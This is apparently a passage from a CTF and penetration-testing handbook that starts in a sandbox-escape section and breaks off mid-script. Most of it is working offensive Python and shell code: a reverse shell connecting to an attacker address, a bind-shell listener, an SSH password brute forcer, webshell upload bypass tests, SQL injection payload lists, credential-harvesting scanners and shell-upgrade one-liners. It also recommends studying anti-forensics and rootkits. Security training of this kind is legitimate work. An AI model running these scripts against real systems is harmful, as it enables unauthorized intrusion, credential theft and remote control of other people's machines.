# Check for virtio devices (QEMU/KVM indicator)
lspci | grep -i virtio

# Historical QEMU vulnerabilities for escape:
# - CVE-2019-14378: IP packet buffer overflow
# - CVE-2020-14364: USB emulation buffer overflow
# - CVE-2021-3592: Slirp networking buffer overflow

# [Unverified] Exploitation requires:
# 1. Vulnerable QEMU version
# 2. Specific device configuration
# 3. Complex exploitation of device emulation bugs
```

**General Sandbox Escape Methodology**

```bash
#!/bin/bash
# Systematic sandbox escape reconnaissance

echo "[*] Sandbox Escape Reconnaissance"

# 1. Identify sandbox type
echo "[+] Checking environment type..."
if [ -f "/.dockerenv" ]; then
    echo "    Docker container"
elif grep -q "lxc" /proc/1/cgroup 2>/dev/null; then
    echo "    LXC container"
elif systemd-detect-virt >/dev/null 2>&1; then
    echo "    VM: $(systemd-detect-virt)"
else
    echo "    Unknown or bare metal"
fi

# 2. Check privileges and capabilities
echo "[+] Checking capabilities..."
capsh --print 2>/dev/null || echo "    capsh not available"
id

# 3. Check kernel version (for known exploits)
echo "[+] Kernel version:"
uname -a

# 4. Check mounted filesystems
echo "[+] Mounted filesystems:"
mount | grep -v "type proc\|type sysfs\|type devpts"

# 5. Check available devices
echo "[+] Available devices:"
ls -la /dev/ | grep -E "sd|nvme|vd|hd" | head -5

# 6. Check for escape vectors
echo "[+] Checking escape vectors:"
[ -S "/var/run/docker.sock" ] && echo "    Docker socket accessible!"
[ -c "/dev/kmsg" ] && echo "    Kernel messages accessible (privileged)!"
[ -w "/sys/kernel" ] && echo "    Sysfs writable!"

# 7. Check seccomp/AppArmor/SELinux
echo "[+] Security modules:"
cat /proc/self/attr/current 2>/dev/null || echo "    No AppArmor/SELinux"
grep Seccomp /proc/self/status 2>/dev/null
```

**Important Considerations**

All sandbox escape techniques described here are for educational CTF scenarios. Real-world usage without authorization is illegal.

[Inference] The effectiveness of these techniques depends heavily on:

- Specific sandbox implementation and version
- Configuration and hardening applied
- Available privileges and capabilities
- Kernel version and patch level

[Unverified] Many escape techniques rely on specific vulnerability windows or misconfigurations that may not be present in hardened environments.

---

**Related Important Topics**: When pursuing behavioral analysis evasion in CTF scenarios, consider studying these complementary areas:

- **Anti-forensics techniques** (log manipulation, timestamp modification, artifact deletion)
- **Code obfuscation and packing** (making analysis more difficult)
- **Rootkit development** (hiding processes, files, network connections)
- **Kernel exploitation** (for complete sandbox escape and persistence)

---

# SCRIPTING & AUTOMATION

## Python Exploitation Scripts

### Socket Programming (TCP/UDP)

**Basic TCP Client**

```python
import socket

# Create TCP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to target
target_ip = "192.168.1.100"
target_port = 9999

try:
    sock.connect((target_ip, target_port))
    print(f"[+] Connected to {target_ip}:{target_port}")
    
    # Send data
    sock.send(b"Hello Server\n")
    
    # Receive response
    response = sock.recv(4096)
    print(f"[+] Response: {response.decode()}")
    
except Exception as e:
    print(f"[-] Error: {e}")
finally:
    sock.close()
```

**TCP Server (Bind Shell Listener)**

```python
import socket
import threading

def handle_client(client_socket, addr):
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    
    try:
        # Receive data
        request = client_socket.recv(4096)
        print(f"[+] Received: {request.decode()}")
        
        # Send response
        client_socket.send(b"HTTP/1.1 200 OK\r\n\r\nHello Client")
    except Exception as e:
        print(f"[-] Error handling client: {e}")
    finally:
        client_socket.close()

# Server setup
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("0.0.0.0", 4444))
server.listen(5)

print("[*] Listening on 0.0.0.0:4444")

while True:
    client, addr = server.accept()
    client_handler = threading.Thread(target=handle_client, args=(client, addr))
    client_handler.start()
```

**Buffer Overflow Fuzzer**

```python
import socket
import sys
import time

target_ip = "192.168.1.100"
target_port = 9999

# Create buffer pattern
buffer = b"A" * 100

while True:
    try:
        print(f"[*] Sending {len(buffer)} bytes")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, target_port))
        
        # Send malicious payload
        sock.send(buffer + b"\r\n")
        sock.recv(1024)
        sock.close()
        
        # Increase buffer size
        buffer += b"A" * 100
        time.sleep(1)
        
    except socket.timeout:
        print(f"[-] Timeout at {len(buffer)} bytes")
        break
    except Exception as e:
        print(f"[-] Crashed at {len(buffer)} bytes")
        print(f"[-] Error: {e}")
        sys.exit(0)
```

**UDP Port Scanner**

```python
import socket

def udp_scan(target, ports):
    """
    [Unverified] - UDP scanning reliability depends on ICMP responses,
    which may be filtered by firewalls
    """
    open_ports = []
    
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        
        try:
            # Send empty datagram
            sock.sendto(b"", (target, port))
            
            # Attempt to receive response
            data, addr = sock.recvfrom(1024)
            print(f"[+] Port {port}/udp OPEN (response received)")
            open_ports.append(port)
            
        except socket.timeout:
            # No response may indicate open or filtered
            print(f"[?] Port {port}/udp OPEN|FILTERED")
            
        except socket.error as e:
            # ICMP port unreachable = closed
            print(f"[-] Port {port}/udp CLOSED")
            
        finally:
            sock.close()
    
    return open_ports

# Scan common UDP ports
target = "192.168.1.100"
ports = [53, 67, 68, 69, 123, 161, 162, 500, 514, 520]
udp_scan(target, ports)
```

**Reverse Shell Client**

```python
import socket
import subprocess
import os

def reverse_shell(attacker_ip, attacker_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((attacker_ip, attacker_port))
        
        # Redirect stdin, stdout, stderr to socket
        os.dup2(sock.fileno(), 0)  # stdin
        os.dup2(sock.fileno(), 1)  # stdout
        os.dup2(sock.fileno(), 2)  # stderr
        
        # Spawn shell
        subprocess.call(["/bin/bash", "-i"])
        
    except Exception as e:
        print(f"Connection failed: {e}")

# Connect to attacker
reverse_shell("10.10.10.5", 4444)
```

**Advanced TCP Scanner with Banner Grabbing**

```python
import socket
import concurrent.futures

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((target, port))
        
        if result == 0:
            try:
                # Attempt banner grab
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = sock.recv(1024).decode().strip()
                print(f"[+] Port {port}/tcp OPEN - {banner[:50]}")
                return (port, banner)
            except:
                print(f"[+] Port {port}/tcp OPEN")
                return (port, None)
        
        sock.close()
    except Exception as e:
        pass
    
    return None

def threaded_scan(target, ports, threads=50):
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(scan_port, target, port) for port in ports]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                results.append(result)
    return results

# Scan top ports
target = "192.168.1.100"
ports = range(1, 1001)
open_ports = threaded_scan(target, ports)
```

### HTTP Requests (requests library)

**Basic HTTP Methods**

```python
import requests

target_url = "http://192.168.1.100"

# GET request
response = requests.get(target_url)
print(f"Status: {response.status_code}")
print(f"Headers: {response.headers}")
print(f"Body: {response.text[:200]}")

# POST request with data
data = {"username": "admin", "password": "password123"}
response = requests.post(f"{target_url}/login", data=data)

# POST with JSON
json_data = {"key": "value"}
response = requests.post(f"{target_url}/api", json=json_data)

# Custom headers
headers = {
    "User-Agent": "Mozilla/5.0",
    "X-Forwarded-For": "127.0.0.1"
}
response = requests.get(target_url, headers=headers)

# PUT request
response = requests.put(f"{target_url}/resource/1", data={"field": "updated"})

# DELETE request
response = requests.delete(f"{target_url}/resource/1")
```

**Authentication Methods**

```python
import requests
from requests.auth import HTTPBasicAuth, HTTPDigestAuth

# Basic Authentication
response = requests.get(
    "http://192.168.1.100/admin",
    auth=HTTPBasicAuth("admin", "password")
)

# Digest Authentication
response = requests.get(
    "http://192.168.1.100/admin",
    auth=HTTPDigestAuth("admin", "password")
)

# Bearer Token
headers = {"Authorization": "Bearer YOUR_TOKEN_HERE"}
response = requests.get("http://192.168.1.100/api", headers=headers)

# Session-based authentication
session = requests.Session()
login_data = {"username": "admin", "password": "password"}
session.post("http://192.168.1.100/login", data=login_data)

# Subsequent requests use session cookies
response = session.get("http://192.168.1.100/dashboard")
```

**Web Directory Brute Forcer**

```python
import requests
import concurrent.futures
from queue import Queue

def check_path(base_url, path):
    url = f"{base_url}/{path.strip()}"
    try:
        response = requests.get(url, timeout=5, allow_redirects=False)
        
        if response.status_code == 200:
            print(f"[+] FOUND: {url} (Size: {len(response.content)})")
            return (url, response.status_code, len(response.content))
        elif response.status_code == 301 or response.status_code == 302:
            print(f"[>] REDIRECT: {url} -> {response.headers.get('Location')}")
        elif response.status_code == 403:
            print(f"[!] FORBIDDEN: {url}")
            
    except requests.exceptions.RequestException:
        pass
    
    return None

def dir_bruteforce(base_url, wordlist_file, threads=20):
    with open(wordlist_file, 'r') as f:
        paths = f.readlines()
    
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_path, base_url, path) for path in paths]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                results.append(result)
    
    return results

# Usage
base_url = "http://192.168.1.100"
wordlist = "/usr/share/wordlists/dirb/common.txt"
found = dir_bruteforce(base_url, wordlist)
```

**SQL Injection Tester**

```python
import requests
import urllib.parse

def test_sql_injection(url, param, payloads):
    """
    [Inference] - Detection based on response differences,
    timing variations, or error messages
    """
    vulnerable = []
    
    # Parse URL
    base_url = url.split('?')[0]
    
    for payload in payloads:
        # Encode payload
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{base_url}?{param}={encoded_payload}"
        
        try:
            response = requests.get(test_url, timeout=10)
            
            # Check for SQL error messages
            sql_errors = [
                "sql syntax",
                "mysql_fetch",
                "ora-01",
                "postgresql",
                "sqlite_",
                "syntax error",
                "unclosed quotation"
            ]
            
            for error in sql_errors:
                if error in response.text.lower():
                    print(f"[!] VULNERABLE: {payload[:50]}")
                    print(f"    Error found: {error}")
                    vulnerable.append((payload, error))
                    break
                    
        except Exception as e:
            print(f"[-] Error testing payload: {e}")
    
    return vulnerable

# Common SQLi payloads
payloads = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin' --",
    "admin' #",
    "' UNION SELECT NULL--",
    "1' AND 1=1--",
    "1' AND 1=2--"
]

url = "http://192.168.1.100/page.php"
results = test_sql_injection(url, "id", payloads)
```

**API Enumeration Script**

```python
import requests
import json

def enumerate_api(base_url, endpoints):
    results = {}
    
    for endpoint in endpoints:
        url = f"{base_url}{endpoint}"
        
        # Try different HTTP methods
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
        
        for method in methods:
            try:
                response = requests.request(method, url, timeout=5)
                
                if response.status_code != 404:
                    print(f"[+] {method} {endpoint} - {response.status_code}")
                    
                    if endpoint not in results:
                        results[endpoint] = {}
                    
                    results[endpoint][method] = {
                        'status': response.status_code,
                        'length': len(response.content),
                        'headers': dict(response.headers)
                    }
                    
                    # Try to parse JSON response
                    try:
                        json_data = response.json()
                        results[endpoint][method]['json'] = json_data
                    except:
                        pass
                        
            except Exception as e:
                pass
    
    return results

# Common API endpoints
endpoints = [
    "/api/v1/users",
    "/api/v1/auth",
    "/api/v1/login",
    "/api/users",
    "/api/admin",
    "/api/config",
    "/v1/users",
    "/v2/users"
]

api_url = "http://192.168.1.100"
results = enumerate_api(api_url, endpoints)
print(json.dumps(results, indent=2))
```

**File Upload Exploitation**

```python
import requests

def test_file_upload(upload_url, file_path, parameter_name="file"):
    """
    Test file upload with various bypass techniques
    """
    
    # Read file content
    with open(file_path, 'rb') as f:
        file_content = f.read()
    
    # Test 1: Direct upload
    files = {parameter_name: ('shell.php', file_content, 'application/x-php')}
    response = requests.post(upload_url, files=files)
    print(f"[*] Direct upload: {response.status_code}")
    
    # Test 2: Double extension
    files = {parameter_name: ('shell.php.jpg', file_content, 'image/jpeg')}
    response = requests.post(upload_url, files=files)
    print(f"[*] Double extension: {response.status_code}")
    
    # Test 3: Null byte injection
    files = {parameter_name: ('shell.php%00.jpg', file_content, 'image/jpeg')}
    response = requests.post(upload_url, files=files)
    print(f"[*] Null byte: {response.status_code}")
    
    # Test 4: Content-Type manipulation
    files = {parameter_name: ('image.jpg', file_content, 'image/jpeg')}
    response = requests.post(upload_url, files=files)
    print(f"[*] MIME type bypass: {response.status_code}")
    
    # Test 5: Case variation
    files = {parameter_name: ('shell.PhP', file_content, 'application/x-php')}
    response = requests.post(upload_url, files=files)
    print(f"[*] Case variation: {response.status_code}")

upload_url = "http://192.168.1.100/upload.php"
test_file_upload(upload_url, "webshell.php")
```

### Paramiko for SSH

**Basic SSH Connection**

```python
import paramiko

def ssh_connect(hostname, username, password, port=22):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        client.connect(
            hostname=hostname,
            port=port,
            username=username,
            password=password,
            timeout=10
        )
        
        print(f"[+] Connected to {hostname}")
        return client
        
    except paramiko.AuthenticationException:
        print("[-] Authentication failed")
    except paramiko.SSHException as e:
        print(f"[-] SSH error: {e}")
    except Exception as e:
        print(f"[-] Connection error: {e}")
    
    return None

# Execute command
client = ssh_connect("192.168.1.100", "root", "password")
if client:
    stdin, stdout, stderr = client.exec_command("whoami")
    print(stdout.read().decode())
    client.close()
```

**SSH Key-Based Authentication**

```python
import paramiko

def ssh_key_connect(hostname, username, key_file, port=22):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Load private key
        private_key = paramiko.RSAKey.from_private_key_file(key_file)
        
        client.connect(
            hostname=hostname,
            port=port,
            username=username,
            pkey=private_key
        )
        
        print(f"[+] Connected with SSH key")
        return client
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

# Usage
client = ssh_key_connect("192.168.1.100", "root", "/root/.ssh/id_rsa")
```

**SSH Brute Force**

```python
import paramiko
import sys
from queue import Queue
import threading

def ssh_bruteforce_worker(hostname, username, password_queue, success_queue):
    while not password_queue.empty():
        password = password_queue.get()
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                hostname=hostname,
                username=username,
                password=password,
                timeout=5,
                allow_agent=False,
                look_for_keys=False
            )
            
            print(f"[+] SUCCESS: {username}:{password}")
            success_queue.put((username, password))
            client.close()
            break
            
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {username}:{password}")
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            password_queue.task_done()

def ssh_bruteforce(hostname, username, password_file, threads=5):
    """
    [Unverified] - Success depends on target SSH configuration,
    rate limiting, and account lockout policies
    """
    password_queue = Queue()
    success_queue = Queue()
    
    # Load passwords
    with open(password_file, 'r') as f:
        for line in f:
            password_queue.put(line.strip())
    
    # Start threads
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(
            target=ssh_bruteforce_worker,
            args=(hostname, username, password_queue, success_queue)
        )
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    # Wait for completion
    password_queue.join()
    
    return list(success_queue.queue)

# Usage
results = ssh_bruteforce("192.168.1.100", "root", "/usr/share/wordlists/rockyou.txt")
```

**SFTP File Operations**

```python
import paramiko

def sftp_operations(hostname, username, password):
    try:
        transport = paramiko.Transport((hostname, 22))
        transport.connect(username=username, password=password)
        
        sftp = paramiko.SFTPClient.from_transport(transport)
        
        # List directory
        print("[*] Listing /home directory:")
        files = sftp.listdir('/home')
        for f in files:
            print(f"  - {f}")
        
        # Download file
        sftp.get('/etc/passwd', 'passwd.txt')
        print("[+] Downloaded /etc/passwd")
        
        # Upload file
        sftp.put('exploit.sh', '/tmp/exploit.sh')
        print("[+] Uploaded exploit.sh")
        
        # Change permissions
        sftp.chmod('/tmp/exploit.sh', 0o755)
        
        # Get file stats
        stat = sftp.stat('/tmp/exploit.sh')
        print(f"[*] File size: {stat.st_size} bytes")
        
        sftp.close()
        transport.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")

sftp_operations("192.168.1.100", "user", "password")
```

**SSH Command Execution with PTY**

```python
import paramiko
import time

def ssh_interactive_shell(hostname, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, username=username, password=password)
        
        # Request interactive shell with PTY
        channel = client.invoke_shell()
        
        # Wait for prompt
        time.sleep(1)
        output = channel.recv(4096).decode()
        print(output)
        
        # Send commands
        commands = [
            "whoami",
            "id",
            "uname -a",
            "cat /etc/passwd"
        ]
        
        for cmd in commands:
            channel.send(cmd + "\n")
            time.sleep(1)
            output = channel.recv(4096).decode()
            print(f"[+] Output of '{cmd}':\n{output}")
        
        channel.close()
        client.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")

ssh_interactive_shell("192.168.1.100", "root", "password")
```

### Subprocess Execution

**Basic Command Execution**

```python
import subprocess

# Simple command
result = subprocess.run(['ls', '-la'], capture_output=True, text=True)
print(result.stdout)
print(f"Return code: {result.returncode}")

# Command with shell=True (security consideration below)
result = subprocess.run('whoami', shell=True, capture_output=True, text=True)
print(result.stdout)

# Execute and capture stderr
result = subprocess.run(
    ['nmap', '-sV', '192.168.1.100'],
    capture_output=True,
    text=True,
    timeout=60
)
print(result.stdout)
if result.stderr:
    print(f"Errors: {result.stderr}")
```

**Advanced Process Control**

```python
import subprocess
import os

def execute_command(command, timeout=30):
    """
    [Inference] - Using shell=True with user input creates command injection risks
    """
    try:
        # Use list for arguments (safer than shell=True)
        if isinstance(command, str):
            command = command.split()
        
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            text=True
        )
        
        # Communicate with process
        stdout, stderr = process.communicate(timeout=timeout)
        
        return {
            'stdout': stdout,
            'stderr': stderr,
            'returncode': process.returncode
        }
        
    except subprocess.TimeoutExpired:
        process.kill()
        return {'error': 'Timeout expired'}
    except Exception as e:
        return {'error': str(e)}

# Usage
result = execute_command(['nmap', '-p-', '192.168.1.100'])
print(result['stdout'])
```

**Exploit with Subprocess Injection**

```python
import subprocess
import shlex

def safe_command_execution(user_input):
    """
    Demonstrate safe vs unsafe command execution
    """
    
    # UNSAFE: Direct shell=True with user input
    # DO NOT USE IN PRODUCTION
    # result = subprocess.run(user_input, shell=True, capture_output=True)
    
    # SAFER: Use shlex.quote() for shell escaping
    safe_input = shlex.quote(user_input)
    result = subprocess.run(
        f"echo {safe_input}",
        shell=True,
        capture_output=True,
        text=True
    )
    
    # SAFEST: Use list without shell=True
    result = subprocess.run(
        ['echo', user_input],
        capture_output=True,
        text=True
    )
    
    return result.stdout

# Test with malicious input
malicious_input = "test; cat /etc/passwd"
output = safe_command_execution(malicious_input)
print(output)
```

**Background Process Execution**

```python
import subprocess
import time

def start_background_process(command):
    """
    Start process in background and monitor
    """
    process = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    print(f"[+] Started process PID: {process.pid}")
    
    # Check if process is running
    poll = process.poll()
    if poll is None:
        print("[+] Process is running")
    
    return process

def monitor_process(process):
    """
    Monitor running process
    """
    while True:
        # Check process status
        if process.poll() is not None:
            print("[+] Process finished")
            stdout, stderr = process.communicate()
            print(f"Output: {stdout}")
            break
        
        print("[*] Process still running...")
        time.sleep(2)

# Start listener in background
listener = start_background_process(['nc', '-lvnp', '4444'])

# Do other work...
time.sleep(5)

# Terminate process
listener.terminate()
print(f"[+] Process terminated")
```

**Interactive Shell Spawning**

```python
import subprocess
import pty
import os

def spawn_interactive_shell():
    """
    Spawn interactive shell with proper TTY
    """
    # Method 1: Python pty
    pty.spawn("/bin/bash")
    
def upgrade_shell():
    """
    Upgrade basic shell to full TTY
    """
    # Common techniques for shell upgrade
    commands = [
        "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "script -qc /bin/bash /dev/null",
        "perl -e 'exec \"/bin/bash\";'",
        "/bin/bash -i"
    ]
    
    for cmd in commands:
        try:
            subprocess.run(cmd, shell=True, check=True)
            print(f"[+] Shell upgraded with: {cmd}")
            break
        except:
            continue

# After shell upgrade, set terminal settings:
# Ctrl+Z (background)
# stty raw -echo; fg
# reset
# export TERM=xterm-256color
# stty rows 38 columns 116
```

### Regular Expression Matching

**Pattern Extraction from Text**

```python
import re

def extract_emails(text):
    """
    Extract email addresses from text
    """
    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    emails = re.findall(email_pattern, text)
    return emails

def extract_ips(text):
    """
    Extract IP addresses (IPv4)
    """
    ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
    ips = re.findall(ip_pattern, text)
    
    # Validate IPs
    valid_ips = []
    for ip in ips:
        octets = ip.split('.')
        if all(0 <= int(octet) <= 255 for octet in octets):
            valid_ips.append(ip)
    
    return valid_ips

def extract_hashes(text):
    """
    Extract common hash types
    """
    patterns = {
        'md5': r'\b[a-fA-F0-9]{32}\b',
        'sha1': r'\b[a-fA-F0-9]{40}\b',
        'sha256': r'\b[a-fA-F0-9]{64}\b'
    }
    
    results = {}
    for hash_type, pattern in patterns.items():
        results[hash_type] = re.findall(pattern, text)
    
    return results

# Usage example
text = """
Contact: admin@example.com
Server: 192.168.1.100
Hash: 5f4dcc3b5aa765d61d8327deb882cf99
"""

print("Emails:", extract_emails(text))
print("IPs:", extract_ips(text))
print("Hashes:", extract_hashes(text))
```

**SQL Injection Pattern Detection**

```python
import re

def detect_sqli_patterns(input_string):
    """
    [Inference] - Pattern matching detects common SQLi syntax,
    but may produce false positives or miss obfuscated payloads
    """
    sqli_patterns = [
        r"(\bUNION\b.*\bSELECT\b)",
        r"(\bOR\b\s+\d+\s*=\s*\d+)",
        r"(\bAND\b\s+\d+\s*=\s*\d+)",
        r"(';|\";\s*DROP\s+TABLE)",
        r"(--|\#|\/\*|\*\/)",
        r"(\bEXEC\b.*\bxp_cmdshell\b)",
        r"(\bINTO\b\s+\bOUTFILE\b)",
        r"(\bLOAD_FILE\b)",
        r"(benchmark\s*\()",
        r"(sleep\s*\()",
        r"(waitfor\s+delay)"
    ]
    
    detected = []
    for pattern in sqli_patterns:
        matches = re.finditer(pattern, input_string, re.IGNORECASE)
        for match in matches:
            detected.append({
                'pattern': pattern,
                'match': match.group(),
                'position': match.span()
            })
    
    return detected

# Test
test_input = "1' UNION SELECT username,password FROM users--"
results = detect_sqli_patterns(test_input)
for r in results:
    print(f"[!] Detected: {r['match']} at position {r['position']}")
```

**Log File Pattern Analysis**

```python
import re
from collections import Counter

def analyze_access_log(log_file):
    """
    Parse Apache/Nginx access logs for reconnaissance
    """
    # Apache/Nginx log pattern
    log_pattern = r'(?P<ip>\d+\.\d+\.\d+\.\d+).*\[(?P<datetime>.*?)\].*\"(?P<method>\w+)\s+(?P<uri>.*?)\s+HTTP.*?\"\s+(?P<status>\d+)\s+(?P<size>\d+)'
    
    ips = []
    methods = []
    uris = []
    statuses = []

    with open(log_file, 'r') as f:
        for line in f:
            match = re.search(log_pattern, line)
            if match:
                ips.append(match.group('ip'))
                methods.append(match.group('method'))
                uris.append(match.group('uri'))
                statuses.append(match.group('status'))
    
    # Analyze patterns
    print("[*] Top 10 IP addresses:")
    for ip, count in Counter(ips).most_common(10):
        print(f"    {ip}: {count} requests")
    
    print("\n[*] HTTP Methods:")
    for method, count in Counter(methods).items():
        print(f"    {method}: {count}")
    
    print("\n[*] Top 10 requested URIs:")
    for uri, count in Counter(uris).most_common(10):
        print(f"    {uri}: {count}")
    
    print("\n[*] Status codes:")
    for status, count in Counter(statuses).items():
        print(f"    {status}: {count}")
    
    # Detect suspicious patterns
    suspicious_patterns = [
        r'\.\./',           # Directory traversal
        r'<script',         # XSS attempts
        r'union.*select',   # SQL injection
        r'cmd=',            # Command injection
        r'passwd',          # File disclosure
        r'\.php\?'          # PHP parameter tampering
    ]
    
    print("\n[*] Suspicious activity detected:")
    with open(log_file, 'r') as f:
        for line_num, line in enumerate(f, 1):
            for pattern in suspicious_patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    print(f"    Line {line_num}: {pattern} - {line.strip()[:100]}")

# Usage
# analyze_access_log('/var/log/apache2/access.log')
```

**Credential Extraction from Files**

```python
import re
import os

def extract_credentials(file_path):
    """
    Extract potential credentials from configuration files
    """
    credential_patterns = {
        'password': r'(password|passwd|pwd)\s*[=:]\s*["\']?([^\s"\']+)["\']?',
        'api_key': r'(api[_-]?key|apikey)\s*[=:]\s*["\']?([^\s"\']+)["\']?',
        'secret': r'(secret|token)\s*[=:]\s*["\']?([^\s"\']+)["\']?',
        'connection_string': r'(mongodb://|mysql://|postgresql://|jdbc:)[^\s]+',
        'aws_key': r'(AKIA[0-9A-Z]{16})',
        'private_key': r'-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----'
    }
    
    findings = {}
    
    try:
        with open(file_path, 'r', errors='ignore') as f:
            content = f.read()
            
            for cred_type, pattern in credential_patterns.items():
                matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
                
                if cred_type not in findings:
                    findings[cred_type] = []
                
                for match in matches:
                    findings[cred_type].append({
                        'match': match.group(),
                        'line': content[:match.start()].count('\n') + 1
                    })
    
    except Exception as e:
        print(f"[-] Error reading {file_path}: {e}")
    
    return findings

def scan_directory_for_credentials(directory):
    """
    Recursively scan directory for credential files
    """
    target_files = [
        '.env',
        'config.php',
        'settings.py',
        'web.config',
        'application.properties',
        '.git/config',
        'database.yml',
        'credentials.xml'
    ]
    
    results = {}
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file in target_files or file.endswith(('.conf', '.config', '.ini', '.yaml', '.yml')):
                file_path = os.path.join(root, file)
                print(f"[*] Scanning: {file_path}")
                
                findings = extract_credentials(file_path)
                if any(findings.values()):
                    results[file_path] = findings
    
    return results

# Usage
# results = scan_directory_for_credentials('/var/www/html')
# for file_path, findings in results.items():
#     print(f"\n[+] Found credentials in: {file_path}")
#     for cred_type, matches in findings.items():
#         if matches:
#             print(f"    {cred_type}: {len(matches)} found")
```

**URL Parameter Extraction**

```python
import re
from urllib.parse import urlparse, parse_qs

def extract_url_components(url):
    """
    Extract and analyze URL components
    """
    parsed = urlparse(url)
    
    result = {
        'scheme': parsed.scheme,
        'netloc': parsed.netloc,
        'path': parsed.path,
        'params': parsed.params,
        'query': parsed.query,
        'fragment': parsed.fragment,
        'parameters': parse_qs(parsed.query)
    }
    
    return result

def find_urls_in_text(text):
    """
    Extract all URLs from text content
    """
    url_pattern = r'https?://(?:www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b(?:[-a-zA-Z0-9()@:%_\+.~#?&/=]*)'
    urls = re.findall(url_pattern, text)
    return urls

def analyze_parameters_for_injection(url):
    """
    [Inference] - Identifies potentially vulnerable parameters
    based on naming conventions and patterns
    """
    components = extract_url_components(url)
    vulnerable_params = []
    
    # Suspicious parameter names
    suspicious_names = ['id', 'page', 'file', 'path', 'url', 'redirect', 'cmd', 'exec']
    
    for param, values in components['parameters'].items():
        if param.lower() in suspicious_names:
            vulnerable_params.append({
                'parameter': param,
                'value': values[0] if values else '',
                'reason': f'Suspicious parameter name: {param}'
            })
        
        # Check for file paths
        if values and re.search(r'[/\\]', values[0]):
            vulnerable_params.append({
                'parameter': param,
                'value': values[0],
                'reason': 'Contains file path characters'
            })
    
    return vulnerable_params

# Usage
url = "http://example.com/page.php?id=1&file=../etc/passwd&redirect=http://evil.com"
components = extract_url_components(url)
print("URL Components:", components)

vulns = analyze_parameters_for_injection(url)
for vuln in vulns:
    print(f"[!] {vuln['parameter']}: {vuln['reason']}")
```

### Parsing and Data Extraction

**HTML Parsing with BeautifulSoup**

```python
from bs4 import BeautifulSoup
import requests

def scrape_web_page(url):
    """
    Extract useful information from web pages
    """
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.content, 'html.parser')
        
        data = {
            'title': soup.title.string if soup.title else None,
            'forms': [],
            'links': [],
            'scripts': [],
            'comments': [],
            'meta_tags': []
        }
        
        # Extract forms (potential injection points)
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action'),
                'method': form.get('method', 'GET'),
                'inputs': []
            }
            
            for input_tag in form.find_all('input'):
                form_data['inputs'].append({
                    'name': input_tag.get('name'),
                    'type': input_tag.get('type'),
                    'value': input_tag.get('value')
                })
            
            data['forms'].append(form_data)
        
        # Extract links
        for link in soup.find_all('a', href=True):
            data['links'].append(link['href'])
        
        # Extract scripts
        for script in soup.find_all('script', src=True):
            data['scripts'].append(script['src'])
        
        # Extract HTML comments
        comments = soup.find_all(string=lambda text: isinstance(text, str) and text.strip().startswith('<!--'))
        data['comments'] = [comment.strip() for comment in comments]
        
        # Extract meta tags
        for meta in soup.find_all('meta'):
            data['meta_tags'].append({
                'name': meta.get('name'),
                'content': meta.get('content')
            })
        
        return data
        
    except Exception as e:
        print(f"[-] Error scraping {url}: {e}")
        return None

# Usage
url = "http://192.168.1.100"
data = scrape_web_page(url)

if data:
    print(f"[*] Title: {data['title']}")
    print(f"[*] Found {len(data['forms'])} forms")
    print(f"[*] Found {len(data['links'])} links")
    
    for i, form in enumerate(data['forms']):
        print(f"\n[+] Form {i+1}:")
        print(f"    Action: {form['action']}")
        print(f"    Method: {form['method']}")
        print(f"    Inputs: {len(form['inputs'])}")
```

**JSON/XML Data Extraction**

```python
import json
import xml.etree.ElementTree as ET
import requests

def parse_json_api(url):
    """
    Parse JSON API responses
    """
    try:
        response = requests.get(url)
        data = response.json()
        
        # Recursively extract all keys
